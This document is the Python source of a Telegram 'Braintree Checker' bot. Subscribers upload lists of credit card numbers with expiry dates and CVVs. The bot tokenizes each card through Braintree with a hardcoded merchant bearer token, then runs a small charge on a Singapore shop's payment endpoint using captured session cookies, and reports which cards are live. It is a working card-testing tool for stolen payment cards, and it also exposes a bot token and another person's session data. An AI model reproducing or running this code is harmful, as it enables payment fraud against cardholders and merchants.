import requests, re
import telebot
from telebot import types

import time
ID_ADMIN = 5469808328
token = '7890607220:AAEntCC9PesiUeR5j7Ongsgak-UcNNbU1BM'
bot=telebot.TeleBot(token,parse_mode="markdown")

try:open('UserSub.txt','r').read()
except:open('UserSub.txt','w').write(str(ID_ADMIN))


import requests
import base64
import uuid
import secrets
busylist = []
def Braintree_generate_uuid():
    return str(uuid.uuid4())
def chkkk(cx):
    if '/' in cx:cx=cx.replace('/','|')
    elif ' ' in cx:cx=cx.replace(' ','|')
    else:cx=cx
    cc=cx.split('|')[0]
    mes=cx.split('|')[1]
    ano=cx.split('|')[2]
    cvv=cx.split('|')[3]
    headers = {
        'authority': 'payments.braintree-api.com',
        'accept': '*/*',
        'accept-language': 'ar-EG,ar;q=0.9,en-US;q=0.8,en;q=0.7',
        'authorization': 'Bearer eyJ0eXAiOiJKV1QiLCJhbGciOiJFUzI1NiIsImtpZCI6IjIwMTgwNDI2MTYtcHJvZHVjdGlvbiIsImlzcyI6Imh0dHBzOi8vYXBpLmJyYWludHJlZWdhdGV3YXkuY29tIn0.eyJleHAiOjE3MzM2MjkzODIsImp0aSI6ImU2NjE0YzQ0LTBjYTItNDM3MS1hNTBjLWY4NjUwOTZmYWYwYyIsInN1YiI6InBiZ2dxNTZyNzR5NjVmZ3giLCJpc3MiOiJodHRwczovL2FwaS5icmFpbnRyZWVnYXRld2F5LmNvbSIsIm1lcmNoYW50Ijp7InB1YmxpY19pZCI6InBiZ2dxNTZyNzR5NjVmZ3giLCJ2ZXJpZnlfY2FyZF9ieV9kZWZhdWx0Ijp0cnVlfSwicmlnaHRzIjpbIm1hbmFnZV92YXVsdCJdLCJzY29wZSI6WyJCcmFpbnRyZWU6VmF1bHQiXSwib3B0aW9ucyI6e319.9RR4DCl0iddDrGfR6XYSqWgU6afL1z1ArFLEs3WGp_dvKE_pD3bCJx6lf53ZTYwFeVX2k78TXD-OaggVPBqffw',
        'braintree-version': '2018-05-10',
        'content-type': 'application/json',
        'dnt': '1',
        'origin': 'https://assets.braintreegateway.com',
        'referer': 'https://assets.braintreegateway.com/',
        'sec-ch-ua': '"Not-A.Brand";v="99", "Chromium";v="124"',
        'sec-ch-ua-mobile': '?1',
        'sec-ch-ua-platform': '"Android"',
        'sec-fetch-dest': 'empty',
        'sec-fetch-mode': 'cors',
        'sec-fetch-site': 'cross-site',
        'user-agent': 'Mozilla/5.0 (Linux; Android 10; K) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/124.0.0.0 Mobile Safari/537.36',
    }
    
    json_data = {
        'clientSdkMetadata': {
            'source': 'client',
            'integration': 'custom',
            'sessionId': Braintree_generate_uuid(),
        },
        'query': 'mutation TokenizeCreditCard($input: TokenizeCreditCardInput!) {   tokenizeCreditCard(input: $input) {     token     creditCard {       bin       brandCode       last4       cardholderName       expirationMonth      expirationYear      binData {         prepaid         healthcare         debit         durbinRegulated         commercial         payroll         issuingBank         countryOfIssuance         productId       }     }   } }',
        'variables': {
            'input': {
                'creditCard': {
                'number': cc,
                'expirationMonth': mes,
                'expirationYear': ano,
                'cvv': cvv,
                },
                'options': {
                    'validate': False,
                },
            },
        },
        'operationName': 'TokenizeCreditCard',
    }
    
    response = requests.post('https://payments.braintree-api.com/graphql', headers=headers, json=json_data)

#################@
    token = response.json()['data']['tokenizeCreditCard']['token']
    cookies = {
    'osVisitor': '2f1c568e-241d-461f-bd95-ccf282b6652e',
    '_gcl_au': '1.1.1746051883.1733029841',
    '_ga': 'GA1.1.1965030220.1733029846',
    '_fbp': 'fb.1.1733029849018.720774908865540516',
    '3': 'KrdTkr0KR1694ktcp4CJYJBlsFQ6z5SqFVAhBOS4qHFdFuHR9TgqqQFLp6ljyrLOqRu3YkfkGhhys899Fc3YNk6stL9Iq2m/qT1rM2ZqOqaVwsug4yzzqO07Mw7tdAnJ',
    '1': 'oB1WrysosldogkD2tg5osh0CQ0WPnBylcyPTG2T8lG/TdhIhwkIbCTjTZd7DqD75ONwofQJfIzSyQ+9Lc3RLi86uj1yZvY7eawJXmXA92zpum0izEzSP5ohvIi0kcsziKr1GNGMXtZu4apaBwYqzFtljKGFKqFLHECr7lTkljV7hGxfNuX1gTuCDE6/xoCgOzoR7y7+NENZiqFyjGGiuY+O14z5SGlMzikaLhSelI+QWc8m5KBNsOJYRcueihinkiyugXDccI8tX5JJkX87WPMbucFApP0K2WHLvTtc7GP4QUPvVtMSiMe1DmsgGwHQBp/WIYJlP9VElXucsBCjk5KoaSe8Cel2SKPOikfc1HtVHglvJAQPoYqbTZQv4lWnSCaW6fEgFBTQBAa/Ao2vnRKXLBSdH0CoXrjkHB178b6AtmZ7noQ5iBjLuCb20ujLm97m4C9bdrzC5ss5cpXo8WyX9eNF2ANciTeVQmjCQLqNcCQ0EH8kk4z6J8jz+rXVdWKm+q8UDa2L5h/cDadzJNj3GBQ4GpWRNNAmr4ZRqLKlp50aQpCSvEEqcSJSY7aVfnii0I86s64+T5nPomR666vCJkEUO6rWOURvCKGlJdgdVQ+FQ4rYZA5dH3Iuj1/XhNAowr3QSntpeSRC58C3ZWIbE/wjNk5xWynJphlDlyUGJLRiRBoxs5wxvBrZ518upZDa4+gYq5qS4IJE2WDqyz6WeSABoNdNLPp9tnt5a56Qt/wMqGts753YoVg22GGsnm7XP04riyxcXEioCWWAMnZUWPZEyOuobPyzbAm8zBCAQQdS/hNxDV2YidPUz4hz2vEziZ6eYe7xi+sJgybgMSY70QaXfEmNja6vqvqrBYOI+CJ7Wzr2C3FtGhyehSmwv5lW1lbB3ECv+uSn0EapLckN/ADXbScB314ScBvWDcvO9rmXYCpZiyZYM6oxRZHzNsjGR+nXotIM3dFecq96Ul2ya9dVpcvS+1WbdC98vg0iWB6lyxA1yaqh1a3+B2hfS301R8lcy5vdxkAHf1IqJtVzC6dHgP+wS8NE2+dtFq0M2r1NC/GtItRrD/BI+Os04R1BnCjWX/jEqko5JrJNvwVJkY8ou/9/MgIQtE03qrj6TBxeZdEUMRovVNaGhFrIg9/oRO1yIALWOuFlC76mClf1t/mEzB7KOC7MKO6CefViIBg6shIfNWNS/tcstVVQoDXjKtu3Mh6kEK3+2/MJKSMek0X8Nv2QjxjiaJDNoxlWCou4HqanDEK7+a8oWgSitAnxnPbNCq6Hs3aNG4oPhrKRSXcJhwbnIgdb6mFE6ijLAETjC7U54EFbaePBvve/OEfVHnzn8AJ+qiRPDGAcoUoChAsI2QJzxVWp0U0BlKZcQ+OlPNPmyKpVpYFEhh1S+AjUqYbqFfHsvztNQW4Pj2GPdcshrRtEYJd/ypz1mleM=',
    '2': 'yhgOj7mVJkL2FR4x+HtytcQBCSfw8UMoYjeR0uzaie7dHoMPVE2o4KAgElKfq2DyDEpzcIzuQXjv8mIO3AyHtyArOSA8vo5LSopeCIcJz38IYCM0fkvjPdNvBKiztiHvpKxGkBsqfbz107BMT9idaA==',
    'visid_incap_2624039': 'OsrRADqIRhyjmrSkbwl46r3vS2cAAAAAQkIPAAAAAAD7UcyBbFNHMYr3ro23wFrZ',
    '3': 'pT9cPsFnRd8AdKML8KJ9x89bMVbedtaHrNnVg/yYQMlwMvjEfk5j75ErAFdCyI1IMl6Sa5P+PNNxIUZiCyCi4wxBETHwmPrgV6g9pTxtgqpILWolUbB5ispIhnymwo9C',
    '1': 'pKNnQf5ZKmRzZ2sa5Mtx5ce2iPpsPgJVGX8sGrUtDrqY5p4aVMgAW3jfff2eSDQr63dH4Rmff0PGjT7mGwl46Cr+3FkS5l+SArV04SbuN/nkWXhx13fR6VNyipDSt5eLXlSXd/LUZWiyBCCZkAv5W0uDtdhQU1BK+yjj7ZBqY6VnWWvUX8dY0tuppNFS0LS3m5N8QwG7z1qTCZWPrcf0eGeKlQlM6rfGuhGbqZOfglU4x8xfMZzCkruaEkN1esCG6+Az/2etu5P9HRNJnhSYqwIhZIOg/rizPq7yBcnO0ZptKNmtF0Yybitwrl+4oGHZLzKEt0Uc3lQz1lOzWK2uTMPUs7NJVPczc+sdOCGZyGMq88ByApcNnwIOW51AZqYjpUxf/mBCZkDhulHuR8IFkjWPzZ9fpzx4qaY38hvZgPjrvAuDJXzJQl5g6p5LVoA5SGZ03fHokcZLemWyKAJE9MDhCtQATvEZMyu8wpS3PN9WaCAkjQAi+PFOJqkLWw5cWKBT9HJovpGixZyREIbmcQqzSdyt/6SEe/nWiGLW+8s9Sxvq8KtoZ2BOZTZEoQjArE7+SK03e4ifMlxWyckw/YkmUStc5YHZ6aItOPJn3Cis/pDUSSa5OeMz6CEAs54n0PPR3iDvEM8eKrBzT7mGv56nC6OtTBmkOYfr/176fM8fr0ApKIv+ny2pxNKKYn2KaJBVwmzWigHjW7ZfAuqFvy6Zv+F7UMYXHXq+G3TC28jmNqEh7nZqldhmd4NBUCvB4I0H10iGGL5akN1d/dU5FnXjDclmOv4aovYWBjiCZvR0DV3WzKE9huj9a/f0fCx4ee2axysw3i9HqnPNdZGvxDzucMQNB9uYvnjqT/SeFneYZP8hCgwDGWq9RgBTs7ZpLE83uqIYBZWUdiGNtIj9b9xM8L8bnWsGaYE6LnKgt6reM37ApX8Bi1vQUeWyh6N94MkppAMh4sWLjT+f/NTrNTQuFzC70R5rU+EiyYBFOYf/g//LDk7koPS29SdGQVQwYhHFQzDrSo8tg8niHsX6+fow7mOwXzQmmxTVaSZGYa/mgBsWc9BICU6aUVawDXWRGtEuNif5wUm56q5Rxj1qVtFmpPqbJZ6mHcFgWRsSxqkUA6YdyQ0njNqDq0JBY9jywshDw5HSpgw89UBnNuX4ig+5Ot4Eq00H/IYEdm82yzq+c6FLqaI0xeMQRUP9Aybl7ivY7nY5k3+MvJljXXMo613u8gqae/t8tQ3xEdEPLBGuc8zPMsyvLlupF5el1UHxA1roHakU1CEgum3NuiOGgPm86Rg1GDfqXLIy0Go7kENmMF0ScPCMYOWohfvsLyHtT9c6CRfG5AEJLDNZJx8swqTgpnEs7WEDH5ROUzBnhSuoNlE8UgtqMGEeN1bY9xGR+XZ8IQklP7A+VDuHtRr3nbvCu1Ad1q7Rc1n9mlv7U50=',
    '2': 'yAPwCM+7Z8xmdH5kCWDh8lA5QxOKnBRo9M1R7FWga40FVvY9KzqFW5n84nNpi3zjtV148J9ItHVnj+1R7hNXgOcpUaBLTL3EfxcLaeEZIOCSkehky0GQbEsM/vOoQ/dvG4QJxgPEMC33KQemBY8D7g==',
    'nr2ApolloUser_CS': 'crf%3d90jNVKCHZZhuoxK6xQSuuQdp16k%3d%3buid%3d1363920%3bunm%3dcv55vcoo%40gmail.com',
    'nlbi_2624039': 'GkuTKB5GZFNklONznrr3FQAAAAAEPthIIdwRwet6yGgHLJVk',
    'incap_ses_1573_2624039': '5XyuULp6owMII0DHVmvUFdhmUWcAAAAAj/e79E/3FklN+PklPU+Cbg==',
    'osVisit': '3f637e46-7aad-4905-a4fb-b7e703d6a14f',
    'ASP.NET_SessionId': 'imsiokpd3hp4ie5e3ecjysfk',
    'nr1ApolloUser_CS': 'lid%3dAJXNOIUIDr4vNdlThFXUmg%3d%3dXCp5qDMYwI7lG6X9L8qebA%3d%3d%3btuu%3d63868986083%3bexp%3d63871577783%3brhs%3dqmqs21oSCQNMIa57tnJPUgE%2bd9A%3d%3bhmc%3dmfhD5udvrRtreAi2G40E4JeaXVg%3d',
    '_ga_WSCFS5WWZ0': 'GS1.1.1733387998.8.1.1733389003.0.0.0',
    }
    
    headers = {
        'authority': 'www.lifehub.sg',
        'accept': 'application/json',
        'accept-language': 'ar-EG,ar;q=0.9,en-US;q=0.8,en;q=0.7',
        'content-type': 'application/json; charset=UTF-8',
        'dnt': '1',
        'origin': 'https://www.lifehub.sg',
        'referer': 'https://www.lifehub.sg/product-payment',
        'sec-ch-ua': '"Not-A.Brand";v="99", "Chromium";v="124"',
        'sec-ch-ua-mobile': '?1',
        'sec-ch-ua-platform': '"Android"',
        'sec-fetch-dest': 'empty',
        'sec-fetch-mode': 'cors',
        'sec-fetch-site': 'same-origin',
        'user-agent': 'Mozilla/5.0 (Linux; Android 10; K) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/124.0.0.0 Mobile Safari/537.36',
        'x-csrftoken': '90jNVKCHZZhuoxK6xQSuuQdp16k=',
    }
    
    json_data = {
        'versionInfo': {
            'moduleVersion': 't8t3hUruem2PzeeJ1cRyfQ',
            'apiVersion': 'OjcubfFn7YcjWGXofM4rfQ',
        },
        'viewName': 'LoggedInFlow_PurchaseProduct.PurchaseProductPayment',
        'inputParameters': {
            'Product': {
                'ProductDetails': {
                    'ProductId': '27',
                    'Name': '',
                    'ProductPrice': '0',
                    'TotalPrice': '5',
                    'DiscountPrice': '0',
                    'Order': 0,
                    'Description': '',
                    'Quantity': 0,
                },
            },
            'TokenNonce': token,
        },
    }
    
    response = requests.post(
        'https://www.lifehub.sg/screenservices/NewApollo/LoggedInFlow_PurchaseProduct/PurchaseProductPayment/ActionStep2_GetProductPaymentTokenFor3DS',
        cookies=cookies,
        headers=headers,
        json=json_data,
        timeout=20
    )
    return (response.text)

@bot.message_handler(commands=["start"])
def start(message):

    UsersSubb = open('UserSub.txt','r').read()
    if str(message.from_user.id) in UsersSubb:
        bot.reply_to(message,"*𝘉𝘰𝘵 𝘊𝘩𝘦𝘤𝘬𝘦𝘳*\n*𝘎𝘦𝘵𝘢𝘸𝘢𝘺 𝘉𝘳𝘢𝘪𝘯𝘵𝘳𝘦𝘦*\n\n*- 𝘚𝘦𝘯𝘥 𝘍𝘪𝘭𝘦 𝘵𝘰 𝘊𝘩𝘦𝘤𝘬 ...*")
    else:
        bot.reply_to(message,"*~ للاشتراك : @X_DevR*")

@bot.message_handler(commands=["sub"])
def subscribe(message):
    if message.chat.id == ID_ADMIN:
        iduser = message.text.split(' ')[1]+"\n"
        open('UserSub.txt','a').write(iduser)
        bot.reply_to(message, '- تم التفعيل للمستخدم ✅')

@bot.message_handler(commands=["del"])
def subscribe(message):
    if message.chat.id == ID_ADMIN:
        iduser = message.text.split(' ')[1]
        UsersSubb = open('UserSub.txt','r').read()
        if iduser in UsersSubb:
            NewSubList = ''.join(UsersSubb.split(iduser+'\n'))
            bot.reply_to(message, '- تم الغاء الاشتراك .')
            open('UserSub.txt','w').write(NewSubList)
        else: bot.reply_to(message, '- المستخدم غير مشترك .')

@bot.message_handler(content_types=["document"])
def main(message):
    UsersSubb = open('UserSub.txt','r').read()
    
    if message.from_user.id in busylist: return
    if str(message.from_user.id) in UsersSubb:
        dd = 0
        live = 0
        ch = 0
        ccn = 0
        mss = ''
        busylist.append(message.from_user.id)
        ko = (bot.reply_to(message, "'*- Braintree Checker ▶️*").message_id)
        ee = bot.download_file(bot.get_file(message.document.file_id).file_path)
        with open("combo.txt", "wb") as w:w.write(ee)

        if 1:
            with open("combo.txt", 'r') as file:
                lino = file.read().splitlines()
                total = len(lino)
                for card in lino:
                  try:
                
                    try:data = requests.get('https://lookup.binlist.net/'+card[:6]).json()    
                    except:pass
                    try:bank=(data['bank']['name'])
                    except:bank=('𝙪𝙣𝙠𝙣𝙤𝙬𝙣')
                    try:emj=(data['country']['emoji'])
                    except:emj=('𝙪𝙣𝙠𝙣𝙤𝙬𝙣')
                    try:cn=(data['country']['name'])
                    except:cn=('𝙪𝙣𝙠𝙣𝙤𝙬𝙣')
                    try:dicr=(data['scheme'])
                    except:dicr=('𝙪𝙣𝙠𝙣𝙤𝙬𝙣')
                    try:typ=(data['type'])
                    except:typ=('𝙪𝙣𝙠𝙣𝙤𝙬𝙣')
                    try:url=(data['bank']['url'])
                    except:url=('𝙪𝙣𝙠𝙣𝙤𝙬𝙣')
    
                    mes = types.InlineKeyboardMarkup(row_width=1)
                    TextSuccess = types.InlineKeyboardButton(f'- 𝙎𝙪𝙘𝙘𝙚𝙨𝙨 ✅ -',callback_data='None')
                    Successful = types.InlineKeyboardButton(f"- {ch} -", callback_data='x')
                    
                    TextFailed = types.InlineKeyboardButton(f'- 𝙁𝙖𝙞𝙡𝙪𝙧𝙚 ❌ -',callback_data='None')
                    Failed = types.InlineKeyboardButton(f"- {dd} -", callback_data='x')
                    
                    CcTextB = types.InlineKeyboardButton(f"{card}", callback_data='u8')
    
                    ResponseTextB = types.InlineKeyboardButton(f'{mss}',callback_data='None')
                    
                    TotalText = types.InlineKeyboardButton(f"- 𝙏𝙤𝙩𝙖𝙡 : [ {total} ] -", callback_data='x')
                    mes.add(
                        CcTextB,
    
                        TextSuccess, Successful,
    
                        TextFailed, Failed,
                        
                        ResponseTextB,
                        
                        TotalText
                        )
                    bot.edit_message_text(chat_id=message.chat.id, message_id=ko, text='''*- Braintree Checker ⏸\n\n~ By DeMo*''', reply_markup=mes)
                    
                    try: last = str(chkkk(str(card)))
                    except Exception as e:
                        print(e)
                        last = "Your card was declined."
                    mss = last
                    IsApprovedCC = None
                    # elif 'Card Issuer Declined CVV' in last:IsApprovedCC = True
                    # elif 'Violation' in last:IsApprovedCC = True
                    # elif 'Gateway Rejected: cvv' in last:IsApprovedCC = True
                    if '{"Code":0,"Message":""}' in last:
                        IsApprovedCC = True
                        print('Approved | '+card)
                        print()
                    else:
                        msg = re.findall('Msg: (.*?)"', last)[0]
                        if "Insufficient Funds" in last:IsApprovedCC = True
                        print(msg + ' | ' + card)
                        
                        
                    
        #            print(last)
                    if IsApprovedCC:
                        ch += 1
                        msg1 = f'''
    𝐀𝐩𝐩𝐫𝐨𝐯𝐞𝐝 ✅
    
    𝗖𝗮𝗿𝗱: `{card}`
    𝐆𝐚𝐭𝐞𝐰𝐚𝐲: Braintree .
    𝐑𝐞𝐬𝐩𝐨𝐧𝐬𝐞: Approved
    
    𝐁𝐢𝐧:  {card[:6]} – {dicr} – {typ}
    𝐈𝐬𝐬𝐮𝐞𝐫: {bank}
    𝐂𝐨𝐮𝐧𝐭𝐫𝐲: {cn} – {emj}
    
    *By: DeMo*'''
                        mss = 'Approved ✅'
                        bot.reply_to(message, msg1)
                    else:
                        mss = 'Declined ❌'
                        dd += 1
                    time.sleep(35)
                  except: continue 
                busylist.remove(message.from_user.id)
                bot.reply_to(message, "'*- Finish 💯*")
bot.infinity_polling()
